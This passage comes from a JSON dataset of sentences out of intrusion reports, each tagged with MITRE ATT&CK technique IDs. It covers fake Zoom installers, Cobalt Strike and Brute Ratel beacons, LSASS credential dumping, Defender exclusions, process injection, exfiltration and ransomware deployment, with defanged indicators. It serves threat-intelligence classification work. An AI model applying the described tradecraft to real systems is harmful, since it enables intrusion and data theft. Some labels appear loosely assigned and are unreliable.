    "text": "After this, the threat actor began moving laterally using Cobalt Strike psexec_psh to launch a remote service for a PowerShell Cobalt beacon on a domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They continued to run Cobalt Strike beacons across several more hosts throughout the environment, repeating the pattern observed on the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On one domain controller and a backup server the threat actor dropped a binary svhost.exe.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors executed this file using WMIC on the hosts and passed an IP address to provide a remote server for QDoor to proxy traffic to.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Using this tunnel the threat actor proxied RDP traffic from their server to connect to hosts through the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "They first connected to a file share server where they used the Edge browser to download WinRAR.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They then exfiltrated these archives using the SaaS project management suite Bublup via the Edge browser.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this they then connected to the first domain controller via RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "There they downloaded WinRAR again using the Edge browser, followed by a RAR archive from the temporary file sharing site temp.sh.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This RAR archive contained all the files needed to stage and deploy their ransomware.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After completing the remote ransomware deployment the threat actor used WMIC to execute the ransomware locally on the domain controller they used to stage the remote deployment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon visiting zoommanager[.]com, the user was greeted with a cloned Zoom web page, offering the user to install Zoom, a popular teleconferencing tool.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon pressing the ‘Download’ button, the victim downloads a malicious binary Zoom_v_2.00.4.exe",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The manner in which the victim arrived at this page was unclear in this case.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Well-established methods for distribution include malicious advertising, such as in the ‘ads’ section of a Google search for terms like ‘Zoom’, or through access brokers who set up lures for popular tools to trick the victim into downloading the malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The cloned webpage was only slightly modified to include a small function at the top, loadlink(), which triggers a backend PHP script located at ./download/dwnl.php.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This script was added as an on-click event to some of the ‘Download’ buttons.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor didn’t replace all the links, as most links were still redirected to the legitimate Zoom domain.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Also, some of the ‘download’ related functionality had not been replaced and was still referencing the legitimate Zoom page:",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Zoom installer was created using Inno Setup, a free installer for Windows programs, and served as the delivery mechanism for a multi-stage malware deployment and execution chain.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The trojanized installer was a downloader, more publicly known as “d3f@ckloader”, and is built upon the Pascal Scripting language.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "String analysis of the compiled code revealed references to various zip/cmd files, executables and URLs.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The embedded URLs pointed to various platforms, including OneDrive, Telegram, and Steam.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, the batch script 21.cmd was launched from the C:\\Program Files\\Windows NT directory.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The script was no longer available on the beachhead system at the time of analysis however based on similar d3f@ckloader samples, we assess it was configured to set the ‘hidden’ attribute to all folders and files in the script’s running directory and add the root folder C: to Windows Defender’s exclusion list.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The malware then established a connection to a Steam community profile page to obtain the IP address hosting the second-stage malware.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Inno Download Plugin (idp.dll), a component of Inno Setup, was used to fetch two ZIP files from the remote IP address.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The User-Agent associated with these web requests is very distinctive, making it a useful detection characteristic commonly identified by NIDS(network-based intrusion detection system) signatures.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Following this, the batch script, named 4554.cmd was executed.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "It was configured to extract the contents of both zip files in the C:\\Program Files\\Windows NT directory and run two executables that were stored within those archives.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first archive contained the executable 1522.exe and represented a benign Zoom installer, likely employed to mask the malicious activity and maintain user trust.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "In the second archive resided a collection of files, including a signed executable 152.exe, various DLL files that contain HijackLoader (aka IDAT loader) and its encrypted payload file, artillery.mdb.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The execution flow of 152.exe parallels a previously reported instance, documented by Rapid7, where a similar chain spawns an instance of cmd.exe and ultimately decrypts, loads and injects a SectopRAT payload into the MSBuild.exe process.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This injected MSBuild.exe process then reached out to pastebin to receive its C2 configuration.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the ninth day of the intrusion we observed the SectopRAT process spawn a new command shell and execute the DLL 2905.dll using regsvr32.exe .",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "YARA rule-based memory scanning revealed binary patterns within the loaded process that are consistent with the Brute Ratel C4 framework.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The same DLL was observed facilitating the execution of a Cobalt Strike beacon, run32.exe , that resided in Windows’ temp directory.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Memory scans confirmed this executable as a Cobalt Strike beacon with several various YARA rule hits.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of 152.exe, Hijackloader established persistence on the beachhead system by the creation of a startup entry:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon payload was successfully injected into the dllhost.exe process as indicated by Sysmon event id 10 in the screenshot below.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During the initial loader execution the threat actor used the Windows attrib utility to change the attributes using the following command:",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "+s Sets the System file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "+h Sets the Hidden file attribute.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "/D Applies attrib and any command-line options to directories.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This would have hidden the initial access loader files from being visible when browsing via Explorer, lowering the chance of being discovered.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion the threat actor dropped SectopRAT to disk in %USERPROFILE%\\AppData\\Local\\Temp.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This file was then loaded and executed in memory using MSbuild.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The MSbuild process was then observed being used for SectopRAT C2 communication covered further in the Command and Control section.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Evidence from the intrusion shows that the Cobalt Strike pass-the-hash module was leveraged, resulting in a new cmd.exe process being spawned by dllhost.exe, which indicates a successful attempt to elevate privileges to the local ‘SYSTEM.’",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, the dllhost.exe process initiated a request for access to the LSASS process with the specific permissions mask of 0x1FFFFF (PROCESS_ALL_ACCESS).",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This access request pattern indicated an attempt to perform credential dumping from the LSASS process memory space.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Indicative of this behavior is the 0x1FFFFF Granted access (full process access) and the UNKNOWN in the CallTrace: CallStackTrace showing multiple offsets including ‘UNKNOWN’",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Additional evidence of this activity included the use of Logon type 9 alongside an authentication type of seclogo strongly indicates credential use, akin to the runas command’s /netonly method, as used by Cobalt Strike’s ‘pass the hash’ technique.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It was discovered within the process memory space of the Brute Ratel Badger.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor initially ran hostname, followed by the following commands over a 30-minute time span.",
    "command": "hostname",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "After this, the threat actor decided to drop a new access capability, a Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Moving onto multiple machines in the environment, dropping Cobalt Strike Beacons, the actor performed the following Discovery commands:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Using the proxy capability inside QDoor, they used RDP to access a file server and domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Since QDoor’s C2 communication is unencrypted it’s possible to spot this behavior with Suricata.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "While performing these RDP actions the threat actor leaked their back end hostname via various log events:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On the file server via a RDP session, they used the Edge browser to download WinRAR and used it to begin compressing file share data into an archive.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case, four separate command and control channels were used, SectopRAT, Brute Ratel, QDoor and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "All these frameworks were used by the threat actor to move in and out of the victim’s environment.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The following rules triggered on the traffic, after SectopRAT injected itself into the MSBuild.exe process for 45.141.87[.]218.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This rule fired when traffic to the destination port 15647 was observed:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This rule fired during C2 beaconing activity to destination port 9000 that looked like: 5.181.159[.]31 with the associated domain megupdate.com",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When looking for this activity, the following rules were associated to this IP: ET INFO Observed ZeroSSL SSL/TLS Certificate",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This is interesting as this matches the second Badger which was configured to use a tyk[.]io domain, but showed no traces of execution.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This kind of activity is becoming more common, as this enables threat actors leveraging legitimate infrastructure for their malicious campaigns.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "An example, showing the usage of Cobalt Strike, is this blog from 2022 written by Askar on shells.systems, showing the exact same uri’s as in this campaign.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It is unclear why the threat actor decided to continue with Cobalt Strike instead of Brute Ratel during lateral movement, especially if the unexecuted Badger contained a similar Tyk C2 domain.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "QDoor can also be run with command-line arguments, by passing an address for C2 configuration, which was the case in this intrusion:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using Edge, they went to mystuff.bublup.com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Near the end of day nine, the threat actor prepared for ransomware deployment by downloading a set of files necessary for its propagation.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The file archive utility WinRar 7.0.1 was downloaded using Microsoft Edge and installed on one of the domain controllers.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The Edge history file C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History contained the following entry:",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In August 2023, we observed an intrusion that started with a phishing campaign using PrometheusTDS to distribute IcedID.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "IcedID dropped and executed a Cobalt Strike beacon, which was then used through-out the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Group Policy was used to distribute Cobalt Strike beacons at login to a specific privileged user group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor utilized a suite of tools to support their activities, deploying Rclone, Netscan, Nbtscan, AnyDesk, Seatbelt, Sharefinder, and AdFind.",
    "command": "",
    "labels": [
      "T1016",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion started in August 2023 with a phishing campaign that distributed IcedID malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Here, they were prompted to download a malicious JavaScript file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This batch file used the curl command to download an IcedID DLL file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once the DLL file was executed, the IcedID malware established persistence by creating a scheduled task on the infected system.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Following this, the malware established a command and control (C2) connection with the IcedID servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Through this connection, it executed a series of discovery commands using standard Windows utilities to gather information about the infected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "About 30 hours after inactivity, the IcedID malware downloaded and executed a Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon was staged on the temporary file-sharing website, file.io, and was downloaded to the infected host using PowerShell.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once executed, the threat actor leveraged commonly used system utilities such as net, whoami, nltest, and ping to conduct discovery operations from the Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after these initial discovery operations, we observed access to the Local Security Authority Subsystem Service (LSASS) process, indicating attempts to access credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "They transferred a Cobalt Strike beacon to a domain controller using the Server Message Block (SMB) protocol.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This beacon was then executed via remote services.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After locating the desired network shares, they deployed Rclone, though its usage was brief.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This tool’s initial deployment involved executing a series of system discovery commands on remote hosts through its systeminfo module.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Approximately an hour and a half after initiating data exfiltration with Rclone, the threat actor transitioned to their custom AWSCollector script, to continue the data transfer to AWS S3 bucket storage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As the data exfiltration progressed, they expanded their foothold in the environment by deploying Cobalt Strike beacons to additional hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These were copied to hosts using SMB and the Windows copy utility, followed by the execution of the beacon by remote WMIC commands.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor executed various commands to gather information about the virtualization components, which involved the zipping and suspected exfiltration of targeted documents pertinent to virtualization.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Entering the fifth day, the threat actor continued discovery efforts using many of the same tools previously observed.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During this period, they also began dumping Windows event logs and executing various WMIC discovery commands to gain further insight into the environment.",
    "command": "",
    "labels": [
      "T1005",
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "On the eighth day, the threat actor deployed AnyDesk on a domain controller using a PowerShell script.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On this day we also observed the threat actor deploy a new Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using the AnyDesk access, the threat actor logged into the domain controller and accessed various system administrator utilities, including Sites and Services, Administrative Center, Domains and Trusts, Users and Computers, and Group Policy.",
    "command": "",
    "labels": [
      "T1078",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Following these changes, they expanded their operational scope by installing AnyDesk and Cobalt Strike beacons on additional hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the 28th day of activity, the threat actor resumed operations by attempting to configure a domain controller to proxy RDP access across another network segment using the netsh utility.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the 29th day, they started running discovery checks using net commands.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A bat file was created using a curl command to download the IcedID payload from moashraya[.]com.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using rundll32.exe, it executes the function scab with the arguments \\k arabika752 from the downloaded and renamed file magni.w.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after, we see rundll32.exe accessing and injecting into svchost.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Using memory captured from the system and processing it with MemprocFS; we can see via the memory, YARA scanning confirmation of the IcedID injection into process 4492.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "And then deleted the file%temp%\\festival-.dat.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "A summary of the discovery commands, and other activity can be seen in the Discovery section.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The first Cobalt Strike beacon was downloaded, and subsequently executed, by the threat actor from file.io through the following PowerShell commands.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Via the Cobalt Strike command and control server, the threat actor generated a PowerShell script which injected a stageless beacon into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In order to inject the decoded shellcode, the script retrieves the function pointer for the Windows APIs function GetModuleHandleA and GetProcAddress that are needed to obtain a pointer to VirtualAlloc.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The call to VirtualAlloc creates a new memory section with AllocationType MEM_COMMIT | MEM_RESERVERE (0x3000) and MemoryProtection ExecuteReadWrite (0x40).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This type of variables passed to VirtualAlloc are classic signs of process injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Subsequently, the shellcode is copied into the newly created region of memory and then executed through the Invoke() function.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "By executing the PowerShell script and monitoring the API calls performed by the process through API Monitor, it is possible to identify the calls to InternetConnectA() with the Cobalt Strike C2s specified as parameters.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During the execution of the initial IcedID malware, a scheduled task was created to maintain persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The task was set to run when the user logged in using the ‘LogonTrigger’.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "While audit logging was not enabled to observe the task creation via a 4698 event we were able to use Sysmon registry and file creation events for the task XML to correlate the creation with the initial IcedID malware.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor created several scheduled tasks on different servers, to achieve persistent execution of Cobalt Strike.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As you can see below, the scheduled task files were created by a svchost injected process.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is an example of one of the scheduled tasks created that, when executed, downloads and executes a Cobalt Strike beacon from 51.89.133[.]3.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Download AnyDesk into the ProgramData folder.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Install AnyDesk in silent mode and set the password to access the software remotely.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Installing AnyDesk in this way sets up the program with a service to start automatically, providing the threat actor with an additional means of persistence in the network.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This latter technique is performed by setting the value of the following registry key related to the specific user, to “0”:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "As mentioned in the Execution section, we see IcedID injecting itself into svchost.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We also observed Cobalt Strike injecting into gpupdate.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Later they injected themselves into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dumping PID 4860 from memory and scanning with YARA rules from the LOKI signature base we can find evidence of the Cobalt Strike injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "We can also use the memory file processed with MemprocFS for similar YARA scan hits:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Deletes shadow copies Sets system to boot into recovery mode on next restart  Multiple methods to distribute and execute the ransomware If dll, use rundll32.exe If exe, use regsvr32.exe Using different switches depending if there is additional options, or not.",
    "command": "",
    "labels": [
      "T1070.004",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The domain resolves to 51.89.133[.]3 which has also been seen used as a Cobalt Strike C2 and to serve beacons during other phases of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "108.62.123[.]147 is also identified in the Command and Control section related to Cobalt Strike.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor distributed Dagon Locker ransomware on multiple systems across the environment through the custom PowerShell script, AWScollector, and the locker module described earlier.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "To prevent data recovery and stop multiple services, two different files called sysfunc.cmd were dropped into the systems.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In this case, we observed a threat actor deliver IcedID using this method.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "For the next 21 days, activity was limited to command and control beaconing with no other actions detected.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then connected to the host using AnyDesk and began browsing files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan).",
    "command": "",
    "labels": [
      "T1016",
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "While that was running, the threat actor browsed file shares, looking at various documents including password related documents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On the file server, they continued to review documents, including insurance related files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They conducted another network scan utilizing NetScan.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Following this, they executed a batch script designed to launch the ransomware.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After using this tool, they followed the same batch script execution on this server as previously observed.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
